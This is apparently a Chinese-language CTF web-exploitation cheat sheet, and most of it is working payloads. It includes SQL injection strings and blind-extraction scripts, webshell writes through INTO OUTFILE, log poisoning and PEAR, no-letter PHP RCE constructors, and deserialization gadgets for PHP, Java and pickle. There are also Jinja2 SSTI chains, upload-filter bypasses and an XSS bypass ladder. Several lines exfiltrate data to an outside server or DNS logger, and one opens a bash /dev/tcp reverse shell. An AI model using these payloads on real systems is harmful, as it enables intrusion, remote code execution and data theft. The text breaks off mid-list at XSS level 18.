# Web — Web安全深度参考

## Quick Wins（先试这些）

```bash
# 信息收集
curl -s http://target/robots.txt
curl -s http://target/.git/config
curl -s http://target/.svn/entries
curl -s http://target/WEB-INF/web.xml
curl -s http://target/.env
curl -s http://target/flag
curl -s http://target/admin
curl -s http://target/backup
curl -s http://target/1.php.bak
curl -s http://target/www.zip
curl -s http://target/www.tar.gz
curl -I http://target   # 响应头信息

# 简单注入测试
curl -s "http://target/page?id=1'"
curl -s "http://target/page?id=1' OR '1'='1"
curl -s "http://target/page?id=1' AND SLEEP(5)--+"

# 常用头
curl -s http://target -H "X-Forwarded-For: 127.0.0.1"
curl -s http://target -H "X-Real-IP: 127.0.0.1"
```

## CTF Web 漏洞全景图

| 分类 | 漏洞 | 关键点 |
|------|------|--------|
| 信息收集 | 源码泄露/编辑器文件 | .git, .svn, .bak, www.zip, 编辑器备份 |
| 注入 | SQL, NoSQL, 模板(SSTI), XXE | 对应语法绕过 |
| 身份认证 | JWT伪造/弱密码/SSO | 算法混淆, 密钥爆破 |
| 文件操作 | 上传/包含/读取 | 截断, 伪协议, 绕过过滤 |
| 命令执行 | RCE/命令注入 | 绕过过滤/编码 |
| 服务端请求 | SSRF | 内网探测/协议绕Firewalling |
| 反序列化 | PHP/Python/Java | 魔术方法/gadget链/ysoserial |
| 逻辑漏洞 | 越权/条件竞争 | IDOR, 未做鉴权 |
| 前端 | XSS/CSRF/CORS | 较少CTF考点, 但可能结合 |

## 信息收集与源码泄露

### 常见敏感路径
```
/admin, /robots.txt, /sitemap.xml, /crossdomain.xml
/.git/config, /.svn/entries, /.hg/
/www.zip, /www.tar.gz, /bak, /backup, /test
/1.php.bak, /index.php.bak, /config.php.bak
/WEB-INF/web.xml (Java)
/.env, /.gitignore
```

### 目录扫描
```bash
# 使用 dirsearch / dirb / gobuster
dirsearch -u http://target -e php,asp,txt,zip,tar.gz
# Python 简单扫描
# for path in open('wordlist.txt'): requests.get(url+path.strip())
```

### PHP 伪协议 (文件包含)
```bash
# 读取源码（常用）
php://filter/convert.base64-encode/resource=flag.php

# 绕过过滤（连续/多重解码）
php://filter/convert.base64-encode|convert.base64-encode/resource=flag
php://filter/string.rot13|convert.base64-encode/resource=flag
php://filter/zlib.deflate|convert.base64-encode/resource=flag

# 字符集变换绕过（UTF-7/UTF-16等）
php://filter/convert.iconv.UTF-8.UTF-7/resource=flag
php://filter/convert.iconv.UTF-8.UTF-16/resource=flag

# data URI 写入
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

# 远程文件包含（allow_url_include=On时）
http://evil.com/shell.txt

# php://input（POST数据体）
# POST body: <?php system('cat /flag');?>
```

### 文件包含 高级绕过技巧 ⭐⭐⭐⭐⭐

**🔑 技巧1: nginx日志文件包含**
```bash
# 条件: 有LFI + 能访问nginx日志 /var/log/nginx/access.log
# 步骤:
# 1. 在User-Agent/URL中注入PHP代码
curl http://target/index.php -H "User-Agent: <?php system('cat /flag');?>"
# 2. 通过LFI包含日志文件
curl "http://target/index.php?file=/var/log/nginx/access.log"
# 日志文件常用路径:
# /var/log/nginx/access.log
# /var/log/nginx/error.log
# /var/log/apache2/access.log
# /var/log/apache2/error.log
# /var/log/httpd/access_log
```

**🔑 技巧2: phpinfo LFI (临时文件竞争)**
```bash
# 条件: 有LFI + phpinfo页面可访问
# 原理: 上传文件时PHP生成临时文件 /tmp/phpXXXXXX,
#       phpinfo中 FILES 会显示 tmp_name,
#       脚本有效期内包含临时文件即可RCE
# 工具: phpinfo_lfi.py (位于 D:\蚁景-ctf\CTF\misc_materials2\初级\脚本)
python phpinfo_lfi.py target_host 80 10
```

**🔑 技巧3: session文件包含 (upload_progress)**
```bash
# 条件: session.upload_progress.enabled=On (默认开启)
# 原理: PHP自动清理session, 但在处理请求时session文件存在
# 利用: 发送multipart上传请求, 在PHP_SESSION_UPLOAD_PROGRESS中注入PHP代码
# 同时用LFI包含 /tmp/sess_<PHPSESSID>

# session路径常见:
# /tmp/sess_<PHPSESSID>
# /var/lib/php/sessions/sess_<PHPSESSID>
# 详见: session_lfi.py 脚本
```

**🔑 技巧4: PEAR扩展文件包含**
```bash
# 条件: PEAR扩展安装 + register_argc_argv=On
# PEAR默认路径: /usr/local/lib/php/pearcmd.php

# 方法1: 远程下载shell
?file=/usr/local/lib/php/pearcmd.php&+install+-R+/var/www/html/+http://evil.com/shell.php

# 方法2: 写配置文件
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=`$_POST[1]`;?>+/var/www/html/shell.php

# 方法3: 生成配置文件, 注入PHP代码
?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/ctf.php+-d+man_dir=<?eval($_POST[1]);?>+-s+
```

**🔑 技巧5: 远程文件包含 → 域名转数字IP**
```bash
# 绕过 . 的过滤
# 正常: http://evil.com/shell.txt
# 绕过: http://<IP数字>/shell.txt
# 域名 → IP → 十进制数字: http://2130706433/shell.txt (= 127.0.0.1)
# 计算工具: http://www.msxindl.com/tools/ip/ip_num.asp
```

**🔑 技巧6: 包含 /proc/self/environ**
```bash
# 如果User-Agent可注入, 可尝试包含环境变量
curl http://target/?file=/proc/self/environ -H "User-Agent: <?php system('cat /flag');?>"

# 其他 /proc 路径:
/proc/self/fd/0     → stdin
/proc/self/fd/1     → stdout
/proc/self/fd/2     → stderr
/proc/self/cmdline  → 启动命令
```

**文件包含解题流程:**
```
1. 先试 php://filter 读源码 → 看过滤规则
2. 如果有 data://  → 直接写shell
3. 如果有 input:// → POST body写shell
4. 尝试 /proc/self/environ + User-Agent注入
5. 尝试 nginx/apache 日志包含
6. 尝试 session upload_progress 竞争
7. 尝试 PEAR扩展 包含
8. 尝试远程文件包含 (需要开启 allow_url_include)
9. 如果有后缀限制, 寻找路径截断 (.php%00)
```

## SQL 注入

### 注入类型速查

| 类型 | 条件 | 方法 |
|------|------|------|
| **联合查询** | 有回显点 | UNION SELECT |
| **布尔盲注** | 页面二分(正确/错误) | IF+SUBSTR+逐字符 |
| **时间盲注** | 页面无变化 | SLEEP/BENCHMARK/笛卡尔积 |
| **报错注入** | 有mysql报错信息 | updatexml/extractvalue/exp |
| **堆叠注入** | 支持多语句执行 | 分号分隔多条SQL |
| **二次注入** | 数据存入后再被引用 | 先插入恶意数据,触发时注入 |

### 判断存在
```
单引号: id=1'  → 报错
逻辑判断: id=1' AND '1'='1  (真) / id=1' AND '1'='2  (假)
时间盲注: id=1' AND SLEEP(3)--+
```

### 联合查询注入
```sql
' UNION SELECT 1,2,3--+                    -- 确定列数
' UNION SELECT 1,database(),user()--+      -- 查库名用户
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--+
' UNION SELECT 1,group_concat(username,'~',password),3 FROM users--+
-- 读文件
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--+
-- 读文件16进制
' UNION SELECT 1,HEX(LOAD_FILE('/etc/passwd')),3--+
-- 写shell
' UNION SELECT "<?php system($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php'--+
```

### 报错注入
```sql
-- updatexml (最常用)
' OR updatexml(1,concat('^',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'^'),1)--+

-- extractvalue (同功能)
' OR extractvalue(1,concat('^',(select group_concat(column_name) from information_schema.columns where table_name='users'),'^'))--+

-- 整数溢出报错
' OR exp(~(SELECT * FROM (SELECT database())a))--+
' OR pow(2,~(SELECT * FROM (SELECT database())a))--+

-- 不存在函数报错
' AND ctfshow()--+
```

### 布尔盲注
```python
import requests
url = "http://target/login.php"
result = ""
for i in range(1, 50):
    for c in range(32, 127):
        # 逐字符判断
        payload = f"admin' OR (ASCII(SUBSTRING((SELECT password FROM admin LIMIT 1),{i},1))={c})-- "
        data = {"username": payload, "password": "x"}
        r = requests.post(url, data=data)
        if "登录成功" in r.text:  # 正确回显
            result += chr(c)
            print(result)
            break
        else:
            print(f"尝试第{i}位: {chr(c)}")
```

### 时间盲注（5种延迟方法）

```sql
-- 方法1: SLEEP (最常用)
' AND IF((SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a', SLEEP(3), 1)--+

-- 方法2: BENCHMARK (无sleep时替代)
' AND IF((SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a', BENCHMARK(5000000,MD5('x')), 1)--+

-- 方法3: 笛卡尔积延迟 (绕过sleep/benchmark过滤)
' AND IF(2>1, (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.tables C), 1)--+
-- 表越多延迟越明显

-- 方法4: GET_LOCK延迟 (长连接有效, Java/Python连接池)
' AND GET_LOCK('ctfshow',3)--+
-- 注意: PHP每次请求新建连接, 长连接才有效

-- 方法5: RLIKE正则延迟
' AND IF(2>1, (SELECT 'a' RLIKE REPEAT('(a.*)+',30)), 1)--+
```

### 堆叠注入
```sql
-- 前提: mysqli_multi_query() 或类似多语句支持
'; INSERT INTO users VALUES('hacker','password')--+
'; ALTER TABLE users ADD flag VARCHAR(255)--+
'; SET @a=0x73656C656374202A2066726F6D207573657273; PREPARE st FROM @a; EXECUTE st;--+
-- 存储过程: 用 SET @a=... 准备语句绕过过滤
```

### 二次注入
```
条件: 1) 插入的数据被过滤后存入DB  2) 取出时未过滤直接拼接SQL

示例流程:
1. 注册用户名为: admin'--+   (经过过滤后存入数据库)
2. 修改密码时: UPDATE users SET password='xxx' WHERE username='admin'--+'
   → name从DB取出时未过滤, 注入成功
```

### 不同注入点技巧

```sql
-- SELECT子句注入 (控制select后的列)
select {inject},content from page
→ select (select password from users where username='admin'),content from page

-- ORDER BY/GROUP BY后注入
select title,content from page order by {inject}
→ select title,content from page order by title,IF(2>1,SLEEP(3),1)

-- LIMIT后注入 (MySQL 5.6前)
select title,content from page limit {inject}
→ select title,content from page limit 1 PROCEDURE ANALYSE(updatexml(1,concat('^',(select user()),'^'),1))
```

### 通用技巧

```sql
-- 字符串转16进制
select 0x61646D696E  -- = 'admin'

-- 函数替换绕过过滤
SUBSTR → SUBSTRING / MID / LEFT / RIGHT
GROUP_CONCAT → 逐条读取
空格 → /**/ / %09 / %0a / %0d / () 包裹

-- 无列名盲注
' UNION SELECT 1,(SELECT `2` FROM (SELECT 1,2,3 UNION SELECT * FROM users)a LIMIT 1),3--+
```

### SQLmap
```bash
sqlmap -u "http://target/page?id=1" --batch
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
sqlmap -r request.txt --batch  # 从请求文件
sqlmap -u "http://target/login" --data="user=admin&pass=admin" --batch
sqlmap -u "http://target/page?id=1" --os-shell  # 尝试写shell
```

## PHP 弱类型 + 反序列化

### 弱类型比较
```php
// == 不严格比较（自动类型转换）
"0e12345" == "0e67890"  // true! 科学计数法0e开头 → 0
md5('240610708') == md5('QNKCDZO')  // 都是0e开头
// 数组绕过:
md5(array()) == null == md5(array())  // true
sha1(array()) === sha1(array())  // true (PHP 5.x)
strcmp(array(), "abc") == null  // true
```

### PHP 反序列化

**魔术方法:**
| 方法 | 触发时机 |
|------|---------|
| `__construct()` | new对象时 |
| `__destruct()` | 对象销毁时 |
| `__wakeup()` | unserialize()时 |
| `__sleep()` | serialize()时 |
| `__toString()` | 对象被当字符串用 (echo) |
| `__get($key)` | 访问不存在的属性 |
| `__call($name, $args)` | 调用不存在的方法 |
| `__invoke()` | 对象当函数用 |

**基本利用:**
```php
class Evil {
    public $cmd = "cat /flag";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Evil());  // 生成payload
// O:4:"Evil":1:{s:3:"cmd";s:9:"cat /flag";}
```

**绕过技巧:**
- `__wakeup()` 绕过: 修改属性数大于实际数 (PHP < 7.4)
- 利用 `C:` 绕过正则匹配（自定义序列化格式）
- `S:` 绕过（大写S表示16进制序列化字符串）
- Phar 反序列化: `phar://` 伪协议触发

### PHP RCE 命令/代码执行 深度绕过

**命令执行函数（Command Execution）:**
```php
system($cmd)        // 有回显, 返回最后一行
passthru($cmd)      // 有回显, 直接输出
exec($cmd, $arr)    // 无回显, 结果存数组
shell_exec($cmd)    // 无回显, 返回字符串
popen($cmd, 'r')    // 管道读取
pcntl_exec($path)   // 进程替换
`$cmd`              // 反引号 = shell_exec
```

**代码执行函数（Code Execution）:**
```php
eval('php代码')
assert('php代码')   // PHP7中assert不再是函数
call_user_func('system', 'cat /flag')
call_user_func_array('system', ['cat /flag'])
preg_replace('/pat/e', 'system("cat /flag")', $str)  // /e修饰符(PHP<7)
create_function($args, $code)  // PHP<7.2
```

**命令执行绕过技巧:**

```bash
# 1. 命令替换法
cat → tac, more, less, head, tail, nl, rev, sort, od, strings
# 空格绕过
cat<flag  cat<>flag  cat${IFS}flag  cat$IFS$9flag  cat%09flag

# 2. 通配符绕过
/???/c?t /??a?        → /bin/cat /flag
cat ????.???           → cat flag.php
cat f*                 → cat flag

# 3. 编码绕过
cat `echo 'L2ZsYWc=' | base64 -d`  → cat /flag
cat $(printf "\x2f\x66\x6c\x61\x67")  → cat /flag

# 4. 变量拼接
b=c;a=at;c=fla;d=g;$a$b /$c$d     → cat /flag
a=ca;b=t;${a}${b} /flag

# 5. 环境变量截取
${PATH:0:1} → /
${PWD:0:1}  → /
# 利用环境变量中的字符拼接命令
```

**无回显RCE通道:**
```bash
# DNS信道 (最隐蔽)
curl `cat /flag`.xxx.ceye.io
nslookup `cat /flag|base64`.xxx.dnslog.cn

# HTTP信道
curl http://your-server/$(cat /flag | base64)
wget --post-data="flag=$(cat /flag)" http://your-server/

# 写入文件 + 二次读取
cat /flag > /var/www/html/out.txt
# 浏览器访问 http://target/out.txt

# 反弹Shell
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

# 时间盲注式
if [ $(cat /flag|head -c 1) = "f" ];then sleep 3;fi
```

### PHP 字符构造绕过（无字母/数字RCE）⭐⭐⭐⭐⭐

**场景**: 过滤了字母/数字/符号后仍需执行命令

```php
// 🔑 核心1: 取反构造 (Bitwise NOT)
// ~"\x8F\x97\x8F\x96\x91\x99\x90" = "system"
// Python生成: urllib.parse.quote(bytes([~ord(c) & 0xFF for c in 'system']))
(~%8F%97%8F%96%91%99%90)(~%9C%9E%8B%DF%D0%99%93%9E%98)  // system('cat /flag')

// 取反PHP生成脚本:
$system = 'system';
$cmd = 'cat /flag';
echo '(~'.urlencode(~$system).')(~'.urlencode(~$cmd).');';

// 🔑 核心2: 异或构造 (XOR)
// 两个非字母字符异或得到任意ASCII
("%09"^"%26") → 'a'  (0x09 ^ 0x26 = 0x63 = 'a')
// PHP脚本: xor.php 生成异或字典
echo "(".$chars1."^".$chars2.")";

// XOR生成脚本核心:
for ($i=0; $i<256; $i++) {
    for ($j=0; $j<256; $j++) {
        if (!preg_match('/[a-z0-9]/i', hex2bin(dechex($i)))
         && !preg_match('/[a-z0-9]/i', hex2bin(dechex($j)))) {
            $c = (urldecode('%'.dechex($i)) ^ urldecode('%'.dechex($j)));
            if (ord($c)>=32 && ord($c)<=126) {
                echo $c." = %".dechex($i)." ^ %".dechex($j)."\n";
            }
        }
    }
}

// 🔑 核心3: 或构造 (OR)
("%13"|"%60") → 's'  (0x13 | 0x60 = 0x73 = 's')
// 同上异或脚本, 将 ^ 改为 |

// 🔑 核心4: 自增构造 (PHP 7.0.x)
// 从 [] 开始逐位递增构造任意函数名
$_=[];  // Array → 'Array'字符串
$_=$_[''=='' + ...];  // 从Array取字符"A"
// 详见自增构造.php脚本 → 最终得到 assert($_POST[_])

// 🔑 核心5: 函数动态调用技巧
$_GET[a]($_GET[b])     // ?a=system&b=cat /flag
$_POST[_]($_POST[__])  // POST: _=system&__=cat /flag
${$_GET[a]}($_GET[b])  // 动态变量
${"\x73\x79\x73\x74\x65\x6d"}('cat /flag')

// 🔑 核心6: 无括号RCE
include$_GET[1];  // ?1=data://text/plain,<?php system('cat /flag');
require$_GET[1];
include$_GET[1]?>.php  // 利用 PHP 自动附加 .php
```

### PHP 代码审计常见漏洞
```php
// 文件包含
include($_GET['file']);

// 任意命令执行
system($_GET['cmd']);
eval($_POST['code']);
preg_replace('/pattern/e', $_POST['cmd'], $str);  // /e 修饰符 (PHP < 7)

// 文件包含写shell
file_put_contents($_GET['file'], $_POST['content']);

// SSRF 读文件
file_get_contents($_GET['url']);

// assert 执行
assert($_GET['cmd']);
```

## Java 反序列化

### 常用工具
- **ysoserial**: 生成各种gadget链的payload
  ```bash
  java -jar ysoserial.jar CommonsCollections1 'cmd' > payload.bin
  ```
- 常见入口: `readObject()`, `readUnshared()`, `readObjectNodData()`

### 常见Gadget链
| 链名 | JDK依赖 | 第三方库 |
|------|---------|---------|
| CommonsCollections1 | 需要cc3.1+ | commons-collections |
| CommonsCollections2 | 需要cc4.0+ | commons-collections4 |
| CommonsCollections5 | JDK8u76前 | commons-collections |
| Fastjson | - | fastjson 1.2.24/47 |
| Shiro | - | shiro rememberMe |
| JNDI注入 | log4j | JNDI lookup |

### Shiro 反序列化
```bash
# 爆破key
python shiro_exploit.py -u http://target
# 利用
python shiro_exploit.py -u http://target -k "key" -p "command"
```

### Fastjson 反序列化
```json
// 1.2.24
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit"}
```

## SSTI (模板注入)

### 模板引擎识别
- Jinja2 (Python): `{{7*7}}` → 49
- Twig (PHP): `{{7*7}}` → 49
- Freemarker (Java): `${7*7}` → 49
- Velocity (Java): `#set($x=7*7)$x` → 49
- Smarty (PHP): `{$smarty.now}` 或 `{7*7}`
- Mako (Python): `${7*7}` → 49

### Jinja2 SSTI利用
```python
# 基础探测
{{7*7}}  → 49
{{config}}  # 查看配置

# 获取所有子类
{{''.__class__.__mro__[1].__subclasses__()}}

# 寻找 os 模块
{{''.__class__.__mro__[1].__subclasses__()[X]}}
# X 为 warnings.catch_warnings / linecache 等的位置

# 执行命令
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('cat /flag').read()}}

# 绕过过滤 ([]被过滤)
{{''|attr('__class__')}}
{{''.__class__.__base__.__subclasses__()}}
```

## SSRF (服务端请求伪造)

### 常见利用
```bash
# 内网探测
?url=http://127.0.0.1:8080/admin
?url=http://localhost:6379  # Redis未授权

# 读取本地文件
?url=file:///etc/passwd
?url=file:///var/www/html/flag.php

# SSRF 绕过
# DNS重绑定（如1.1.1.1.1.1.ip6name.com → 127.0.0.1）
# URL解析差异（@符号, # 截断）
# 短链接
# 302跳转到内网
# IPv6 绕过 (http://[::1]:80)
```

## JWT

### 常见攻击
```python
# 安装: pip install pyjwt

# 1. 算法混淆攻击 (alg:none)
# Header: {"alg":"none","typ":"JWT"}
# 库的实现缺陷: jwt.decode(token, verify=False)

# 2. HS256 对称密钥爆破
# 使用 john/hashcat 爆破已知公钥的 HS256 JWT
# python jwt_tool.py <token> -C -d wordlist.txt

# 3. RS256 公钥泄露 → HS256 签发（用公钥当密钥）
# jwt.encode(payload, public_key, algorithm='HS256')
```

## 上传绕过 ⭐⭐⭐⭐⭐

### Level 1: 后缀黑名单绕过

```bash
# 双写绕过（php被替换为空时）
1.pphphp → 1.php

# 大小写绕过
shell.PhP → shell.php

# 替代后缀（如果php被禁）
.php3  .php4  .php5  .phtml  .pht  .phps  .inc  .shtml  .phar

# Windows特性: 末尾加点/空格
shell.php. → shell.php
shell.php → shell.php（NTFS自动去空格）
shell.php::$DATA → shell.php（NTFS备用数据流）

# Content-Type绕过
Content-Type: image/jpeg 或 image/png 或 image/gif

# 文件头魔术字节绕过
GIF89a<?php system('cat /flag');?>
\x89PNG\r\n\x1a\n...<?php system($_GET['c']);?>
```

### Level 2: 00截断绕过

```bash
# PHP版本 < 5.3.4 时可用 %00 截断
# GET方式: shell.php%00.jpg
# POST方式: shell.php\x00.jpg
# Java版本 < 7u40 时也可用

# iconv字符转换截断 (PHP < 5.4)
# utf-8编码范围 0x00-0x7f, 超范围字符导致iconv异常截断
shell.php%df.jpg  → 截断为 shell.php
```

### Level 3: 服务端解析漏洞

```bash
# Apache 多后缀解析
# Apache不认识的后缀会向前找认识的
123.php.ctfshow  → 解析为 PHP
123.php.xxx      → 解析为 PHP

# Apache .htaccess 绕过白名单
# 上传 .htaccess:
AddType application/x-httpd-php .jpg
# 然后上传 shell.jpg → 解析为PHP

# nginx cgi.fix_pathinfo (默认开启)
# 上传 shell.jpg, 访问 http://target/upload/shell.jpg/xxx.php
# 当 xxx.php 不存在时, nginx会用PHP解析 shell.jpg

# IIS6 目录解析
# 目录名为 xxx.asp → 该目录下所有文件按ASP解析
# 上传到 /upload.asp/shell.jpg → ASP解析

# nginx .user.ini (替代 .htaccess)
# 上传 .user.ini:
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg
# 然后访问任意 .php 文件会自动包含 shell.jpg
```

### Level 4: 内容检测绕过

```bash
# getimagesize() 检测绕过 → 使用XBM格式
# XBM格式: #define %s %d 被识别为图片宽高
#define width 100
#define height 100
<?php system($_GET['c']);?>

# PHP短标签绕过 <? 检测
<?=system($_GET['c']);?>
<?=`$_GET[1]`;?>
<script language="php">system($_GET['c']);</script>

# 关键字拆分绕过（如过滤 system/eval）
sys.tem(命令)  → $a='sys';$b='tem';$a.$b('cat /flag');
```

### Level 5: 二次渲染绕过

```python
# PNG二次渲染绕过 (服务端用 imagepng() 重新生成)
# 原理: 将payload写入PNG的IDAT数据块中, 渲染后保留
from PIL import Image
# 在PLTE调色板块后面插入payload → 可能绕过渲染

# JPG二次渲染绕过 (服务端用 imagecreatefromjpeg)
# 将payload写入JPG的COM(0xFFFE)注释段或DQT量化表后
# 使用专用脚本: php jpg_exp.php target.jpg
```

### Level 6: ImageMagic 漏洞

```bash
# ImageMagic <= 3.3.0 (CVE-2016-3714)
# php.ini中启用imagick扩展 + php>5.4 + new Imagick()处理
# 上传恶意SVG图片:
<svg/onload=setTimeout("document.write('<?php system(\"cat /flag\");?>')")>
# 或使用MSL/MVG格式触发命令执行
```

### PHP文件上传解题流程

```
1. 先试简单后缀: .php5 .phtml .pht
2. 试双写: .pphphp
3. 试Content-Type改 image/jpeg + 文件头加 GIF89a
4. 试 %00 截断: .php%00.jpg
5. 试 .htaccess/.user.ini 配置写入
6. 试解析漏洞: Apache多后缀 / nginx pathinfo / IIS目录
7. 试 XBM格式绕过getimagesize
8. 试 二次渲染绕过
9. 试 ImageMagic漏洞
10. 终极: 条件竞争 (上传后在被删前访问)
```

## SSRF/XXE (XML外部实体注入)

```xml
<!-- 读取文件 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root>&xxe;</root>
```

## 常用爆破字典
- SecLists: https://github.com/danielmiessler/SecLists
- 常用路径: /admin, /flag, /shell.php, /backup
- 常用参数: id, file, cmd, url, action, page, page, dir

## 参考脚本 (D:\CTF常用脚本\)
- `正常盲注.py` — SQL 布尔盲注框架
- `IIS文件上传.py` — IIS PUT 漏洞
- `ssh弱口令加提取flag.py` — SSH 暴力+远程命令
- `自动提交flag.py` — CTF 竞赛自动提交

---

## 新增: Node.js 相关漏洞

### Node.js 原型链污染
```javascript
// 原理: __proto__ 赋值导致所有对象继承属性
// 场景1: 对象merge函数未防御
app.post('/update', (req, res) => {
    let user = { name: 'guest', role: 'user' };
    // 如果 req.body = {"__proto__": {"role": "admin"}}
    // 则所有对象都会被污染为 admin
    Object.assign(user, req.body);
    res.send(user);
});

// 场景2: lodash.merge / jQuery.extend
// _.merge({}, JSON.parse(req.body))

// 检测:
// 传入 {"__proto__": {"admin": true}}
// 检查是否返回了 admin: true
```

### Express 配置泄露
```javascript
// X-Powered-By: Express
// 错误处理中可能泄露源码路径
// {{}} 在数组中的表现

// 常见 Express 审计点:
// 1. body-parser 的 JSON parse 导致原型链污染
// 2. multer 文件上传
// 3. express-session 的 cookie 签名
```

### Npm 包漏洞
```
// 查看 package.json → 找已知CVE
// node-serialize 反序列化 → 命令执行
// ejs/template 注入
```

---

## 新增: Python Web 框架漏洞

### Flask/Django SSTI 补充
```python
# Flask Jinja2 SSTI 全链

# 测试: {{7*7}} → 49
# 测试: {{config}} → 配置信息

# 绕过下划线/中括号
{{()|attr('\x5f\x5fclass\x5f\x5f')}}
{{()|attr('__class__')}}

# 利用 request 对象
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# 利用 lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# 利用 url_for
{{url_for.__globals__['os'].popen('id').read()}}

# 利用 get_flashed_messages
{{get_flashed_messages.__globals__['os'].popen('id').read()}}
```

### Python pickle RCE
```python
# 场景: 服务端反序列化用户提供的数据
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('cat /flag',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

### Python eval/exec 沙箱逃逸（Web端）
```python
# 场景: 提供一个 Python eval 沙箱接口
# 限制: 只允许特定函数/库

# 常用逃逸链（对应 Misc 中的 PyJail 章节）
().__class__.__bases__[0].__subclasses__()
# 用 166/128/131 等索引加载 os
```

---

## 新增: NoSQL 注入

### MongoDB 注入
```javascript
// Node.js + MongoDB 场景

// URL参数注入:
// ?id=1&name[$ne]=admin  → 非等于查询
// ?id[$gt]=1  → 大于查询
// ?id[$regex]=^a  → 正则查询

// POST JSON 注入:
// {"username": {"$ne": null}, "password": {"$ne": null}}
// {"username": {"$regex": "^a"}}
// {"$where": "this.password.length > 0"}

// 布尔盲注模板 (MongoDB):
import requests
url = "http://target/login"
for i in range(1, 33):
    for c in range(32, 127):
        payload = {"username": {"$regex": f"^{'a'*i}{chr(c)}"}, "password": {"$ne": None}}
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            print(chr(c), end='')
            break
```

---

## 新增: GraphQL 注入

### 通用检测
```graphql
# 测试是否存在 GraphQL
GET /graphql?query={__typename}
POST /graphql -d '{"query":"{__typename}"}'

# 内省查询（查看所有Schema）
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### GraphQL 注入攻击
```graphql
# 批量查询（批量获取数据）
query {
  user1: user(id: 1) { name, email, password }
  user2: user(id: 2) { name, email, password }
  admin: user(id: "admin") { name, email, password }
}

# SQL注入（如果后端用SQL）
mutation {
  login(username: "admin' OR '1'='1", password: "test") { token }
}

# DoS (深度递归查询)
query {
  posts {
    comments {
      user {
        posts {
          comments { user { name } }
        }
      }
    }
  }
}
```

---

## 新增: HTTP 请求走私

### 识别
```bash
# CL.TE 攻击:
# Content-Length 和 Transfer-Encoding 不一致

# 探测:
curl -x http://target:80 http://example.com/ -H "Transfer-Encoding: chunked" -d "0\r\n\r\n"

# 利用:
# 1. 绕过前端ACL检查
# 2. 缓存投毒
# 3. 窃取用户请求
```

---

## 新增: CSRF + CORS 混合

### CORS 配置错误利用
```javascript
// 服务端返回:
// Access-Control-Allow-Origin: null
// Access-Control-Allow-Credentials: true

// 利用:
// <iframe sandbox="allow-scripts" src="https://target/api/getflag"></iframe>
// sandbox → origin=null → 匹配 null → 读取响应

// 或 Access-Control-Allow-Origin: http://attacker.com
// → 直接构造XHR请求
```

---

## 新增: 条件竞争/越权综合

### 越权 (IDOR)
```
// 修改参数:
// /api/user/1 → /api/user/2 （垂直越权）
// /api/user?id=1 → /api/user?id=2

// JWT中用户ID -> 篡改JWT
// 隐藏API端点 -> 找API文档/JS文件
```

### 条件竞争 (Race Condition)
```python
# 场景: 上传→检查→删除的过程中访问
# 参考 Misc 章节的详细模板
```

---

## 新增: 简单但常考的Web漏洞

### 目录穿越/路径遍历
```
../../etc/passwd
..\..\..\Windows\System32\drivers\etc\hosts
../../../../../etc/passwd%00
....//....//....//etc/passwd  (双点过滤绕过)
..;/..;/..;/etc/passwd  (Tomcat绕过)
/%2e%2e/%2e%2e/etc/passwd  (URL编码)
```

### XSS 完整绕过阶梯 (Level 1-19)

```html
===== Level 1: 直接注入 =====
<script>alert(1)</script>

===== Level 2: 闭合value属性 =====
"><script>alert(1)</script><"

===== Level 3: 事件绕过（htmlspecialchars过滤<>）=====
'onclick=javascript:alert(1)'        <!-- 点击触发 -->
" onmouseover=alert(1) x="           <!-- 鼠标悬停 -->

===== Level 4: 单引号闭合 =====
' onclick=javascript:alert(1) '

===== Level 5: a href绕过（on被替换o_n）=====
"><a href=javascript:alert(1)>click</a><"

===== Level 6: 大小写绕过href过滤 =====
"><a hRef=javascript:alert(1)>click</a><"

===== Level 7: 双写绕过（script→scr_ipt）=====
"><scr<script>ipt>alert(1)</scr</script>ipt><"

===== Level 8: Unicode编码绕过 =====
\u003cscript\u003ealert(1)\u003c/script\u003e

===== Level 9: 自动添加链接 → 无闭合 =====
javascript:alert(1)

===== Level 10: 隐藏域注入关键字过滤 =====
?t_sort=" onclick=javascript:alert() type="text

===== Level 11: Referer头注入 =====
# <>被过滤，用"事件绕过
Referer: " onclick=javascript:alert() type="text

===== Level 12: User-Agent头注入 =====
User-Agent: " onclick=javascript:alert() type="text

===== Level 13: Cookie头注入 =====
Cookie: user=" onclick=javascript:alert() type="text

===== Level 14: Angular JS ng-include =====
?src='level1.php?name=<img src=x onerror=alert(1)>'

===== Level 15: Angular JS 模板注入 =====
{{'a'.constructor.prototype.charAt=[].join;
 $eval('x=1} } };alert(1)//');}}

===== Level 16: 回车代替空格绕过 =====
# /和空格被过滤
?keyword=<svg%0Aonload=alert(1)>        <!-- %0A=换行 -->

===== Level 17: DOM跳转XSS =====
?jumpto=javascript:alert(1)
?jumpto=javascript:$.getScript('//xss.xx/platform.js')

===== Level 18: SVG标签绕过 =====
